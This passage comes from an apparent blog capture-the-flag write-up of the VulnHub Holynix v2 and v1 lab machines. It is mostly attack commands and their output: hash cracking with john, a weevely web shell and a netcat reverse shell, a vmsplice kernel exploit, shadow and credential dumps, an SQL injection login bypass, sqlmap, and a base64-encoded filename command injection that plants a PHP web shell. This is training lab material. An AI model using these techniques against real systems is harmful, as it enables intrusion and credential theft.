+</span><span class='line'>skrymple:$1$zjyNa1C0$x2JA4Tm61q3N0Fq06gXun1:1031:2002::/home/skrymple/./::::::::::::
+</span><span class='line'>evorhees:$1$ITHWZZd0$Qhs38Q7QpRTe./Npk25hu/:1031:2002::/home/evorhees/./::::::::::::
+</span><span class='line'>rfrost:$1$3Nqexaj0$eJv5nfOYM71jvlTEA1iv..:1031:2002::/home/rfrost/./::::::::::::
+</span><span class='line'>ahuxley:$1$ObpCAT60$LTqCcrqMGAgv8YMyva5Sr0:1031:2002::/home/ahuxley/./::::::::::::
+</span><span class='line'>cmanson:$1$gMHNCq70$RCOXC8pfElSRvh5BFc5fF0:1031:2002::/home/cmanson/./::::::::::::
+</span><span class='line'>webmaster:$1$v2tdHOX0$MnLOX4cXqZYL99QbDDZ/1/:1031:2002::/var/www/./::::::::::::</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# john hashes.john --wordlist="/usr/share/wordlists/rockyou.txt"  --rules
+</span><span class='line'>millionaire      (tmartin)
+</span><span class='line'>chatterbox1      (cbergey)
+</span><span class='line'>bravenewworld    (ahuxley)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We uploaded weevely to web directory of tmartin user via ftp:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ftp> put weevely.php
+</span><span class='line'>local: weevely.php remote: weevely.php
+</span><span class='line'>200 PORT command successful
+</span><span class='line'>150 Connecting to port 49625
+</span><span class='line'>226-File successfully transferred
+</span><span class='line'>226 0.000 seconds (measured here), 1.87 Mbytes per second
+</span><span class='line'>610 bytes sent in 0.00 secs (29785.2 kB/s)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The kernel was vulnerable (vmsplice, 5092.c) and because weevely shell always
+logged out root user, we used reverse shell and the writable /dev/shm
+directory.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb/platforms/linux/local# nc -lvp 1337
+</span><span class='line'>listening on [any] 1337 ...
+</span><span class='line'>
+</span><span class='line'>www-data@:/dev/shm $ :backdoor.reversetcp 192.168.1.34 -port 1337 -vector netcat-bsd
+</span><span class='line'>[backdoor.reversetcp] [!] Error: Binding socket [Errno 98] Address already in use
+</span><span class='line'>
+</span><span class='line'>www-data@:/dev/shm $ :file.upload /usr/share/exploitdb/platforms/linux/local/5092 5092</span></code></pre></td></tr></table></div></figure>
+
+
+<p>On our Kali Linux:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>connect to [192.168.1.34] from www.zincftp.com [192.168.1.88] 49100
+</span><span class='line'>/bin/sh: can't access tty; job control turned off
+</span><span class='line'>$ chmod +x 5092
+</span><span class='line'>$ ./5092
+</span><span class='line'>bash: no job control in this shell
+</span><span class='line'>root@holynix2:/dev/shm# cat /etc/shadow
+</span><span class='line'>root:$1$wMs1EClc$90lJ2ckB8jbibX.yrE7ac0:14949:0:99999:7:::
+</span><span class='line'>daemon:*:14949:0:99999:7:::
+</span><span class='line'>bin:*:14949:0:99999:7:::
+</span><span class='line'>sys:*:14949:0:99999:7:::
+</span><span class='line'>sync:*:14949:0:99999:7:::
+</span><span class='line'>games:*:14949:0:99999:7:::
+</span><span class='line'>man:*:14949:0:99999:7:::
+</span><span class='line'>lp:*:14949:0:99999:7:::
+</span><span class='line'>mail:*:14949:0:99999:7:::
+</span><span class='line'>news:*:14949:0:99999:7:::
+</span><span class='line'>uucp:*:14949:0:99999:7:::
+</span><span class='line'>proxy:*:14949:0:99999:7:::
+</span><span class='line'>www-data:*:14949:0:99999:7:::
+</span><span class='line'>backup:*:14949:0:99999:7:::
+</span><span class='line'>list:*:14949:0:99999:7:::
+</span><span class='line'>irc:*:14949:0:99999:7:::
+</span><span class='line'>gnats:*:14949:0:99999:7:::
+</span><span class='line'>nobody:*:14949:0:99999:7:::
+</span><span class='line'>libuuid:!:14949:0:99999:7:::
+</span><span class='line'>dhcp:*:14949:0:99999:7:::
+</span><span class='line'>syslog:*:14949:0:99999:7:::
+</span><span class='line'>klog:*:14949:0:99999:7:::
+</span><span class='line'>bind:*:14949:0:99999:7:::
+</span><span class='line'>sshd:*:14949:0:99999:7:::
+</span><span class='line'>mysql:!:14949:0:99999:7:::
+</span><span class='line'>lsanderson:$1$d1rHIv2m$301/2naFEYQbmjg/CJZbO0:14949:0:99999:7:::
+</span><span class='line'>cfinnerly:$1$7BPRHJcw$3W/9R.1BNqMJvvHWSa9jC/:14949:0:99999:7:::
+</span><span class='line'>ddonnovan:$1$.aIQOdgq$JnPLWS9ETJEmPvvMZFgqK.:14949:0:99999:7:::
+</span><span class='line'>skrymple:$1$nCenIeL7$3fq23HWXI1/cYX7q9FGVa0:14949:0:99999:7:::
+</span><span class='line'>amckinley:$1$cZn8zx7p$0oURMPJj4U9UM0XhmhQM71:14951:0:99999:7:::
+</span><span class='line'>cmahong:!:14949:0:99999:7:::
+</span><span class='line'>lnickerbacher:!:14949:0:99999:7:::
+</span><span class='line'>jstreet:!:14949:0:99999:7:::
+</span><span class='line'>rwoo:!:14949:0:99999:7:::
+</span><span class='line'>kmccallum:!:14949:0:99999:7:::
+</span><span class='line'>cjalong:!:14949:0:99999:7:::
+</span><span class='line'>jsmith:!:14949:0:99999:7:::
+</span><span class='line'>dhammond:!:14949:0:99999:7:::
+</span><span class='line'>hmcknight:!:14949:0:99999:7:::
+</span><span class='line'>lwestre:!:14949:0:99999:7:::
+</span><span class='line'>gwelch:!:14949:0:99999:7:::
+</span><span class='line'>dmoran:!:14949:0:99999:7:::
+</span><span class='line'>dsummers:!:14949:0:99999:7:::
+</span><span class='line'>bzimmerman:!:14949:0:99999:7:::
+</span><span class='line'>ncobol:!:14949:0:99999:7:::
+</span><span class='line'>ddypsky:!:14949:0:99999:7:::
+</span><span class='line'>rcropper:!:14949:0:99999:7:::
+</span><span class='line'>cbergey:!:14949:0:99999:7:::
+</span><span class='line'>tmartin:!:14949:0:99999:7:::
+</span><span class='line'>jgacy:!:14949:0:99999:7:::
+</span><span class='line'>splath:!:14949:0:99999:7:::
+</span><span class='line'>evorhees:!:14949:0:99999:7:::
+</span><span class='line'>rfrost:!:14949:0:99999:7:::
+</span><span class='line'>ahuxley:!:14949:0:99999:7:::
+</span><span class='line'>webmaster:!:14949:0:99999:7:::
+</span><span class='line'>cmanson:!:14949:0:99999:7:::
+</span><span class='line'>vftp:!:14949:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We also found:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@holynix2:/var/www/dev# cat dbconn.php
+</span><span class='line'>&lt;?php
+</span><span class='line'>        $db_host = 'localhost';
+</span><span class='line'>        $db_user = 'root';
+</span><span class='line'>        $db_pass = 'dynamo59956783';
+</span><span class='line'>        $db_name = '_zincftp_data';
+</span><span class='line'>        $conn = mysql_connect($db_host, $db_user, $db_pass) or die("Unable to connect to MySQL");
+</span><span class='line'>        mysql_select_db($db_name,$conn) or die("Could not select Database");</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If there is not a vulnerable phpmyadmin, we can read the files to table too, according:</p>
+
+<p>1) zincftp_data ->  Create new table on database zincftp_data</p>
+
+<p>2) Name = ftp_pass, Number of fields = 1</p>
+
+<p>3) Field = pass, Type = varchar, Length = 100</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>SQL Query Window:
+</span><span class='line'>
+</span><span class='line'>LOAD DATA LOCAL INFILE '/etc/pure-ftpd/pureftpd.passwd' INTO TABLE ftp_pass LINES TERMINATED BY '\n'</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/10/holynix-v1/">Holynix: V1</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-10T13:54:06+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:54 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/holynix-v1,20/">Holynix: v1</a></p>
+
+<p>We set networking in Vmware Fusion as &ldquo;Share with my Mac&rdquo; and check the
+obtained IP address:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/var/db/vmware:
+</span><span class='line'>lease 192.168.80.142 {
+</span><span class='line'>        starts 4 2015/04/30 16:18:54;
+</span><span class='line'>        ends 4 2015/04/30 16:48:54;
+</span><span class='line'>        hardware ethernet 00:0c:29:bc:05:de;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nmap output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap -sV -p- 192.168.80.142
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-27 07:16 CEST
+</span><span class='line'>Nmap scan report for 192.168.80.142
+</span><span class='line'>Host is up (0.00028s latency).
+</span><span class='line'>Not shown: 65534 closed ports
+</span><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
+</span><span class='line'>MAC Address: 00:0C:29:BC:05:DE (VMware)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There is a SQL injection in the web login, we submit the following username and password:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>test' or '1'='1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Via security (ssp.php) we can disclose arbitrary file (for example /etc/passwd):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
+</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
+</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
+</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
+</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
+</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
+</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
+</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
+</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
+</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
+</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+</span><span class='line'>dhcp:x:101:102::/nonexistent:/bin/false
+</span><span class='line'>syslog:x:102:103::/home/syslog:/bin/false
+</span><span class='line'>klog:x:103:104::/home/klog:/bin/false
+</span><span class='line'>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+</span><span class='line'>mysql:x:105:114:MySQL Server,,,:/var/lib/mysql:/bin/false
+</span><span class='line'>alamo:x:1000:115::/home/alamo:/bin/bash
+</span><span class='line'>etenenbaum:x:1001:100::/home/etenenbaum:/bin/bash
+</span><span class='line'>gmckinnon:x:1002:100::/home/gmckinnon:/bin/bash
+</span><span class='line'>hreiser:x:1003:50::/home/hreiser:/bin/bash
+</span><span class='line'>jdraper:x:1004:100::/home/jdraper:/bin/bash
+</span><span class='line'>jjames:x:1005:50::/home/jjames:/bin/bash
+</span><span class='line'>jljohansen:x:1006:115::/home/jljohansen:/bin/bash
+</span><span class='line'>ltorvalds:x:1007:113::/home/ltorvalds:/bin/bash
+</span><span class='line'>kpoulsen:x:1008:100::/home/kpoulsen:/bin/bash
+</span><span class='line'>mrbutler:x:1009:50::/home/mrbutler:/bin/bash
+</span><span class='line'>rtmorris:x:1010:100::/home/rtmorris:/bin/bash</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With sqlmap we can dump the whole database (%40 means &lsquo;@&rsquo; character):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># sqlmap -u "http://192.168.80.142/index.php?page=login.php&user_name=a&password=a&Submit_button=Submit" --dump-all</span></code></pre></td></tr></table></div></figure>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.142/dump# cat creds/accounts.csv
+</span><span class='line'>cid,upload,username,password
+</span><span class='line'>1,0,alamo,Ih%40cK3dM1cR05oF7
+</span><span class='line'>2,1,etenenbaum,P3n7%40g0n0wN3d
+</span><span class='line'>3,1,gmckinnon,d15cL0suR3Pr0J3c7
+</span><span class='line'>4,1,hreiser,Ik1Ll3dNiN%40r315er
+</span><span class='line'>5,1,jdraper,p1%40yIngW17hPh0n35
+</span><span class='line'>6,1,jjames,%40rR35t3D%40716
+</span><span class='line'>7,1,jljohansen,m%40k1nGb0o7L3g5
+</span><span class='line'>8,1,kpoulsen,wH%407ar37H3Fed5D01n
+</span><span class='line'>9,0,ltorvalds,f%407H3r0FL1nUX
+</span><span class='line'>10,1,mrbutler,n%405aHaSw0rM5
+</span><span class='line'>11,1,rtmorris,Myd%40d51N7h3NSA</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Using sqlmap &ndash;passwords parameter we got:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>database management system users password hashes:
+</span><span class='line'>[*] debian-sys-maint [1]:
+</span><span class='line'>    password hash: %2A04DDBBF6BA7B43D9B78611E125C80124644D17B8
+</span><span class='line'>[*] root [1]:
+</span><span class='line'>    password hash: %2AA69F92BBDEA591F5BB9E4A049F0C181D6DB5177E</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Back to the web page, there is a cookie set as &lsquo;uid=1&rsquo;. We can try different
+numbers, because not every user has allowed to upload file, see accounts.csv.</p>
+
+<p>We disclose transfer.php script:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span> <span class="p">(</span> <span class="nv">$auth</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;&lt;center&gt;&lt;h2&gt;Content Restricted&lt;/h2&gt;&lt;/center&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>        <span class="k">if</span> <span class="p">(</span> <span class="nv">$upload</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+</span><span class='line'>        <span class="p">{</span>
+</span><span class='line'>                <span class="nv">$homedir</span> <span class="o">=</span> <span class="s2">&quot;/home/&quot;</span><span class="o">.</span><span class="nv">$logged_in_user</span><span class="o">.</span> <span class="s2">&quot;/&quot;</span><span class="p">;</span>
+</span><span class='line'>                <span class="nv">$uploaddir</span> <span class="o">=</span> <span class="s2">&quot;upload/&quot;</span><span class="p">;</span>
+</span><span class='line'>                <span class="nv">$target</span> <span class="o">=</span> <span class="nv">$uploaddir</span> <span class="o">.</span> <span class="nb">basename</span><span class="p">(</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploaded&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="p">;</span>
+</span><span class='line'>                <span class="nv">$uploaded_type</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploaded&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">];</span>
+</span><span class='line'>                <span class="nv">$command</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>                <span class="nv">$ok</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>                <span class="k">if</span> <span class="p">(</span> <span class="nv">$uploaded_type</span> <span class="o">==</span><span class="s2">&quot;application/gzip&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;autoextract&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;true&#39;</span> <span class="p">)</span> <span class="p">{</span> <span class="nv">$command</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="nv">$ok</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>                <span class="p">{</span>
+</span><span class='line'>                        <span class="k">echo</span> <span class="s2">&quot;Sorry your file was not uploaded&quot;</span><span class="p">;</span>
+</span><span class='line'>                        <span class="k">echo</span> <span class="s2">&quot;&lt;a href=&#39;?index.php?page=upload.php&#39; &gt;Back to upload page&lt;/a&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>                        <span class="k">if</span><span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploaded&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$target</span><span class="p">))</span>
+</span><span class='line'>                        <span class="p">{</span>
+</span><span class='line'>                                <span class="k">echo</span> <span class="s2">&quot;&lt;h3&gt;The file &#39;&quot;</span> <span class="o">.</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploaded&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span> <span class="s2">&quot;&#39; has been uploaded.&lt;/h4&gt;&lt;br /&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>                                <span class="k">echo</span> <span class="s2">&quot;The ownership of the uploaded file(s) have been changed accordingly.&quot;</span><span class="p">;</span>
+</span><span class='line'>                                <span class="k">echo</span> <span class="s2">&quot;&lt;br /&gt;&lt;a href=&#39;?page=upload.php&#39; &gt;Back to upload page&lt;/a&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>                                <span class="k">if</span> <span class="p">(</span> <span class="nv">$command</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+</span><span class='line'>                                <span class="p">{</span>
+</span><span class='line'>                                        <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;sudo tar xzf &quot;</span> <span class="o">.</span><span class="nv">$target</span><span class="o">.</span> <span class="s2">&quot; -C &quot;</span> <span class="o">.</span><span class="nv">$homedir</span><span class="p">);</span>
+</span><span class='line'>                                        <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;rm &quot;</span> <span class="o">.</span><span class="nv">$target</span><span class="p">);</span>
+</span><span class='line'>                                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>                                        <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;sudo mv &quot;</span> <span class="o">.</span><span class="nv">$target</span><span class="o">.</span> <span class="s2">&quot; &quot;</span> <span class="o">.</span><span class="nv">$homedir</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploaded&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+</span><span class='line'>                                <span class="p">}</span>
+</span><span class='line'>                                <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;/var/apache2/htdocs/update_own&quot;</span><span class="p">);</span>
+</span><span class='line'>                        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>                                <span class="k">echo</span> <span class="s2">&quot;Sorry, there was a problem uploading your file.&lt;br /&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>                                <span class="k">echo</span> <span class="s2">&quot;&lt;br /&gt;&lt;a href=&#39;?page=upload.php&#39; &gt;Back to upload page&lt;/a&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>                        <span class="p">}</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&lt;br /&gt;&lt;br /&gt;&lt;h3&gt;Home directory uploading disabled for user &quot;</span> <span class="o">.</span><span class="nv">$logged_in_user</span><span class="o">.</span> <span class="s2">&quot;&lt;/h3&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As we can see from the source code, the filename is used in shell command and
+we can inject malicious input. However the &lsquo;/&rsquo; or &lsquo;\&rsquo; characters are
+prohibited, because in $target is stored only the value after (back)slash.</p>
+
+<p>Locator (it never terminates, but confirms our finding):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Content-Disposition: form-data; name="uploaded"; filename=";yes;"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can evade the slash restriction encoding the payload as base64 (touch /tmp/owned):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Content-Disposition: form-data; name="uploaded"; filename=";`echo dG91Y2ggL3RtcC9vd25lZA==| base64 -d`;"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There could be a problem with a bigger input (&ldquo;filename too long&rdquo;).</p>
+
+<p>Similarly we upload the following base64 payload redirected to &lsquo;b.php&rsquo;:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/var/www# echo '&lt;?php system($_REQUEST['cmd']); ?>' | base64
+</span><span class='line'>PD9waHAgc3lzdGVtKCRfUkVRVUVTVFtjbWRdKTsgPz4K</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We try our php shell and in the case of success, we upload weevely from our web server:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
